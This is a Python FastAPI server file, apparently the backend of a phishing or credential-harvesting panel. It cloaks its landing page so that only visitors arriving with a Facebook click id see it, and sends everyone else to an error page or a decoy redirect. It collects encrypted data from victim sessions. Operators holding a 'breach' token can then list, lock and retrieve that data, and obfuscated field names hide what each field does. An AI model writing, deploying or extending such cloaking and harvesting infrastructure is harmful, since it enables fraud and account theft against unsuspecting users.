
from fastapi import FastAPI, Request, HTTPException
from fastapi.responses import RedirectResponse, JSONResponse, HTMLResponse
from starlette.exceptions import HTTPException as StarletteHTTPException
from fastapi.templating import Jinja2Templates
from fastapi.staticfiles import StaticFiles
from shemas import *

from loguru import logger

from cryptography.fernet import InvalidToken

from redis_r import redis_cli

from validators import validate_tokens
from utils import generate_token, generate_crypt_key, decrypt_data
from config import redirect_url

app = FastAPI(redoc_url=None, docs_url=None)
app.mount("/static", StaticFiles(directory="static"), name="static")
templates = Jinja2Templates(directory="templates")

active = False

@app.on_event("startup")
async def startup():
    logger.info("Server started")




@app.exception_handler(404)
async def not_found_exception_handler(request: Request, exc: HTTPException):
    return templates.TemplateResponse("error.html", {"request": request})


@app.get("/")
async def index(request:Request, fbclid: str|None=None):
    if active:
        if fbclid:
            logger.debug(f"{request.url}: \n Visited! {request.client}.")
            return templates.TemplateResponse("index.html", {"request": request})
        else:
            return templates.TemplateResponse("error.html", {"request": request})
    else:
        return RedirectResponse(redirect_url)



@app.post("/connect", response_model=ConnectResponseModel)
async def connect(breach_token: str, connect_request: ConnectRequestModel, request: Request):
    if not active:
        return()
    tokens = {
        "breach": breach_token,
        "connect": connect_request.connect_token
    }

    validate_tokens(tokens=tokens, request=request)

    session_token = generate_token()
    crypt_key = generate_crypt_key()

    new_data = {"crypt_key": crypt_key, "status": "preparing"}
    redis_cli.hset(session_token, mapping=new_data)

    return ConnectResponseModel(session_token=session_token, crypt_key=crypt_key)


@app.post("/disconnect")
async def disconnect(breach_token: str, disconnect_request: DisonnectRequestModel, request: Request):
    if not active:
        return()
    session_token = disconnect_request.session_token

    tokens = {
        "breach": breach_token,
        "session": session_token
    }

    validate_tokens(tokens=tokens, request=request)

    redis_cli.delete(session_token)


@app.post("/update")
async def update(breach_token: str, update_request: UpdateRequestModel, request: Request):
    if not active:
        return()
    session_token = update_request.session_token
    tokens = {
        "breach": breach_token,
        "update": update_request.update_token,
        "session": session_token
    }

    validate_tokens(tokens=tokens, request=request)
    
    crypt_key = redis_cli.hget(session_token, "crypt_key")
    encrypted_data = update_request.encrypted_data
    try:
        decrypted_data = decrypt_data(crypt_key=crypt_key, encrypted_data=encrypted_data)
    except InvalidToken:
        logger.warning(f"{request.url}: \n Wrong data encryption! {request.client}.")
        return RedirectResponse("/")

    redis_cli.hset(session_token, "data", decrypted_data)
    redis_cli.hset(session_token, "status", "active")


@app.post("/shutdown", response_model=ShutdownResponseModel)
async def shutdown(breach_token: str, shutdown_request: ShutdownRequsetModel, request: Request):
    tokens = {
        "breach": breach_token,
        "shutdown": shutdown_request.shutdown_token
    }

    validate_tokens(tokens=tokens, request=request)
    
    keys = redis_cli.keys("*")
    if keys:
        redis_cli.delete(*keys)
    
    global active
    active = False
    
    return ShutdownResponseModel(deleted_keys=keys, active=active)


@app.post("/activate")
async def activate(breach_token: str, activate_request: ActivateRequestModel, request: Request):
    tokens = {
        "breach": breach_token,
        "activate": activate_request.activate_token
    }

    validate_tokens(tokens=tokens, request=request)
    keys = redis_cli.keys("*")
    if keys:
        redis_cli.delete(*keys)
    
    global active
    active = True

    return ActivateResponseModel(deleted_keys=keys, active=active)


@app.post("/get", response_model=GetResponseModel)
async def get(breach_token: str, get_request: GetRequestModel, request: Request):
    if not active:
        return()
    tokens = {
        "breach": breach_token,
        "get": get_request.eU9Xehtp30LXt3o14IhqTkhy3Ee1
    }

    validate_tokens(tokens=tokens, request=request)

    keys = redis_cli.keys("*")
    if keys:
        for key in keys:
            status = redis_cli.hget(key, "status")
            if status == "active":
                redis_cli.hset(key, "status", "locked")
                return GetResponseModel(
                    sN246BggZjXTB0bnH3xN6NewNy7a16N9mE9NF6KHcM=key,
                    xywQynARfHj20q6t39ybWzCCLueEUihRMt6vxg=True
                )

    return GetResponseModel(
        sN246BggZjXTB0bnH3xN6NewNy7a16N9mE9NF6KHcM="null",
        xywQynARfHj20q6t39ybWzCCLueEUihRMt6vxg=False
    )


@app.post("/get-data", response_model=GetDataResponseModel)
async def get_data(breach_token: str, get_data_request: GetDataRequestModel, request: Request):
    if not active:
        return()
    session_token = get_data_request.KOtaocIzsb5rQgrxG10Sm1b2UqgHs

    tokens = {
        "breach": breach_token,
        "get_data": get_data_request.Us5vZjR7QA21VVI2D9xR2ZChfoQfEWH4vpcLZ,
        "session": session_token
    }

    validate_tokens(tokens=tokens, request=request)

    data = redis_cli.hget(session_token, "data") 
    return GetDataResponseModel(iYOgo72xmUlFOiXS0cwx7LtlfeRmuR=data)


@app.post("/set")
async def set_status(breach_token: str, set_request: SetRequestModel, request: Request):
    if not active:
        return()
    session_token = set_request.HcuDqZTReL1ActRjpLlaTgAogUCFnLmFChP8nUtCSoQ
    status_code = set_request.sHRNaIvKvRgcutW7iVsPOrdA6

    if status_code == "ExhvNRSe1EOZ9JZu8uPqSffbO6":
        status = "active"
    elif status_code == "m1eI5EN2M6kiyuWoXbMHLpW73Fx5suA":
        status = "locked"
    else:
        logger.warning(f"{request.url}: \n Wrong session status! {request.client}.")
        raise HTTPException(404)
    
    logger.info(status)

    tokens = {
        "breach": breach_token,
        "session": session_token
    }

    validate_tokens(tokens=tokens, request=request)

    redis_cli.hset(session_token, "status", status)


@app.post("/get-s", response_model=GetStatusResponseModel)
async def get_status(breach_token: str, get_status_request: GetStatusRequestModel, request: Request):
    if not active:
        return()
    session_token = get_status_request.BylnIL0Bkw4GbvFmtVJivdMPXlEiEbF

    tokens = {
        "breach": breach_token,
    }
    validate_tokens(tokens=tokens, request=request)

    keys = redis_cli.keys("*")
    if session_token in keys:
        status = redis_cli.hget(session_token, "status")
        if status == "active":
            status_code = "xsKXNa55MMGujASVrXfKLyjMtUICf7LqmGKNdCEDMpc"
        elif status == "locked":
            status_code = "srCOdvltUWogYgCX4b3hFwDVKj8Zv1dLHtTWqZL1HJE"
        else:
            logger.error("Wrong status code in RDB")
            return
    else:
        status_code = "5CQ8SNLryXz1cYENr8tmcXpIgvf33XMEwfztobepl9g"
    
    return GetStatusResponseModel(UW40olHWnbCnN1qFeGoSJqh3yMQNCET6xb2ARROFR10=status_code)


